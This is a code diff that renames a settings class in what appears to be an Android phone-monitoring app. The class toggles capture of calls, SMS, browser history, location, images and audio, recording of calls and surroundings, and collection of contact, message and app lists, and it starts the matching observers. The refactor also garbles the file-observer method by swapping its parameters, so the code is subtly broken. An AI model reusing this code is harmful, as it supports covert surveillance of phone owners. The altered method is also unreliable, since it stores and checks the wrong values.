@@ -6,71 +6,70 @@ import android.content.SharedPreferences.Editor;
 import android.preference.PreferenceManager;
 
 import com.inet.android.bs.ServiceControl;
-import com.inet.android.request.ConstantValue;
+import com.inet.android.request.AppConstants;
 
-public class ValueWork {
+public class AppSettings {
 
-	private static String LOG_TAG = ValueWork.class.getSimpleName().toString();
+	private static String LOG_TAG = AppSettings.class.getSimpleName().toString();
 
 	public static int getState(int method, Context mContext) {
 		if (!WorkTimeDefiner.isDoWork(mContext)) {
 			Logging.doLog(LOG_TAG, "Work time return 0", "Work time return 0");
 			return 0;
 		}
-		return getMethod(method, mContext);
-
+		return getSetting(method, mContext);
 	}
 
-	public static int getMethod(int method, Context mContext) {
+	public static int getSetting(int method, Context mContext) {
 		SharedPreferences sp = PreferenceManager
 				.getDefaultSharedPreferences(mContext);
 		Logging.doLog(LOG_TAG, "method" + method, "method" + method);
 		int value = -1;
 
 		switch (method) {
-		case ConstantValue.TYPE_INCOMING_CALL_REQUEST:
+		case AppConstants.TYPE_INCOMING_CALL_REQUEST:
 			value = Integer.parseInt(sp.getString("call", "0"));
 			break;
-		case ConstantValue.TYPE_INCOMING_SMS_REQUEST:
+		case AppConstants.TYPE_INCOMING_SMS_REQUEST:
 			value = Integer.parseInt(sp.getString("sms", "0"));
 			break;
-		case ConstantValue.TYPE_HISTORY_BROUSER_REQUEST:
+		case AppConstants.TYPE_HISTORY_BROUSER_REQUEST:
 			value = Integer.parseInt(sp.getString("www", "0"));
 			break;
-		case ConstantValue.TYPE_LOCATION_TRACKER_REQUEST:
+		case AppConstants.TYPE_LOCATION_TRACKER_REQUEST:
 			value = Integer.parseInt(sp.getString("geo", "0"));
 			break;
-		case ConstantValue.LOCATION_TRACKER_MODE:
+		case AppConstants.LOCATION_TRACKER_MODE:
 			value = Integer.parseInt(sp.getString("geo_mode", "0"));
 			break;
-		case ConstantValue.TYPE_DISPATCH:
+		case AppConstants.TYPE_DISPATCH:
 			value = Integer.parseInt(sp.getString("dispatch", "0"));
 			break;
-		case ConstantValue.TYPE_IMAGE_REQUEST:
+		case AppConstants.TYPE_IMAGE_REQUEST:
 			value = Integer.parseInt(sp.getString("image", "0"));
 			break;
-		case ConstantValue.TYPE_AUDIO_REQUEST:
+		case AppConstants.TYPE_AUDIO_REQUEST:
 			value = Integer.parseInt(sp.getString("audio", "0"));
 			break;
-		case ConstantValue.RECORD_CALL:
+		case AppConstants.RECORD_CALL:
 			value = Integer.parseInt(sp.getString("rec_call", "0"));
 			break;
-		case ConstantValue.RECORD_ENVORIMENT:
+		case AppConstants.RECORD_ENVORIMENT:
 			value = Integer.parseInt(sp.getString("rec_env", "0"));
 			break;
-		case ConstantValue.RECORD_ENVORIMENT_CALL:
+		case AppConstants.RECORD_ENVORIMENT_CALL:
 			value = Integer.parseInt(sp.getString("rec_env_call", "0"));
 			break;
-		case ConstantValue.TYPE_LIST_CALL:
+		case AppConstants.TYPE_LIST_CALL:
 			value = sp.getInt("list_call", 0);
 			break;
-		case ConstantValue.TYPE_LIST_SMS:
+		case AppConstants.TYPE_LIST_SMS:
 			value = sp.getInt("list_sms", 0);
 			break;
-		case ConstantValue.TYPE_LIST_CONTACTS:
+		case AppConstants.TYPE_LIST_CONTACTS:
 			value = sp.getInt("list_contact", 0);
 			break;
-		case ConstantValue.TYPE_LIST_APP:
+		case AppConstants.TYPE_LIST_APP:
 			value = sp.getInt("list_app", 0);
 			break;
 		}
@@ -96,7 +95,8 @@ public class ValueWork {
 				"changeValueMethod " + method + " " + newValue);
 		switch (method) {
 
-		case ConstantValue.TYPE_INCOMING_SMS_REQUEST:
+		
+		case AppConstants.TYPE_INCOMING_SMS_REQUEST:
 			if (!sp.getString("sms", "0").equals(newValue)) {
 				ed.putString("sms", newValue);
 				ed.commit();
@@ -104,7 +104,7 @@ public class ValueWork {
 					ServiceControl.runSMSObserver(mContext);
 			}
 			break;
-		case ConstantValue.TYPE_HISTORY_BROUSER_REQUEST:
+		case AppConstants.TYPE_HISTORY_BROUSER_REQUEST:
 			if (!sp.getString("www", "0").equals(newValue)) {
 				ed.putString("www", newValue);
 				ed.commit();
@@ -114,7 +114,7 @@ public class ValueWork {
 					ServiceControl.stopLink(mContext);
 			}
 			break;
-		case ConstantValue.TYPE_LOCATION_TRACKER_REQUEST:
+		case AppConstants.TYPE_LOCATION_TRACKER_REQUEST:
 			if (!sp.getString("geo", "0").equals(newValue)) {
 				ed.putString("geo", newValue);
 				ed.commit();
@@ -124,7 +124,7 @@ public class ValueWork {
 					ServiceControl.stopLocation(mContext);
 			}
 			break;
-		case ConstantValue.LOCATION_TRACKER_MODE:
+		case AppConstants.LOCATION_TRACKER_MODE:
 			if (!sp.getString("geo_mode", "0").equals(newValue)) {
 				ed.putString("geo_mode", newValue);
 				ed.commit();
@@ -137,22 +137,22 @@ public class ValueWork {
 		}
 	}
 
-	public static void setValueFileObserverService(String audio, String image,
+	public static void setValueFileObserverService(String method, String value,
 			Context mContext) {
 		SharedPreferences sp = PreferenceManager
 				.getDefaultSharedPreferences(mContext);
 		Editor ed = sp.edit();
 		boolean setRunObserver = false;
-		if (!sp.getString("audio", "0").equals(audio)) {
-			ed.putString("audio", audio);
+		if (!sp.getString("audio", "0").equals(method)) {
+			ed.putString("audio", value);
 			ed.commit();
-			if (audio.equals("1"))
+			if (method.equals("1"))
 				setRunObserver = true;
 		}
-		if (!sp.getString("image", "0").equals(image)) {
-			ed.putString("image", audio);
+		if (!sp.getString("image", "0").equals(method)) {
+			ed.putString("image", value);
 			ed.commit();
-			if (image.equals("1") && setRunObserver)
+			if (value.equals("1") && setRunObserver)
 				ServiceControl.runFileObserver(mContext);
 		}
 	}
